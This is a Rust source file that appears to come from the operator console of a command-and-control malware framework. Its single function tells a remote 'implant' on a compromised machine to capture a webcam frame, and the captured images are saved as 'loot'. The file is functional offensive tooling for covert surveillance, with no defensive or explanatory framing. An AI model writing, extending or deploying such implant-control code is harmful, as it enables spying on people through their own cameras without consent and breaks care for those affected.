//! Webcam capture commands

use anyhow::Result;
use common::ImplantId;

use crate::cli::CliState;
use crate::display::{print_info, print_success};

/// Capture a frame from the implant's webcam
///
/// # Arguments
/// * `device_index` - Optional device index (0-based); defaults to first available device if None
/// * `format` - Optional image format (e.g. "png", "jpeg"); defaults to implant default if None
pub async fn capture(cli: &CliState, device_index: Option<u32>, format: Option<String>) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    let idx = device_index.unwrap_or(0);
    let fmt = format.as_deref().unwrap_or("jpeg");
    print_info(&format!("Capturing webcam frame (device: {}, format: {})...", idx, fmt));

    // Format: "device_index\0format"
    let mut task_data = idx.to_string().into_bytes();
    task_data.push(0);
    task_data.extend_from_slice(fmt.as_bytes());

    let task_id = cli.client.dispatch_task(implant_id, "webcam", task_data).await?;
    print_success(&format!("Webcam capture task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("Image will be saved to loot once complete");

    Ok(())
}
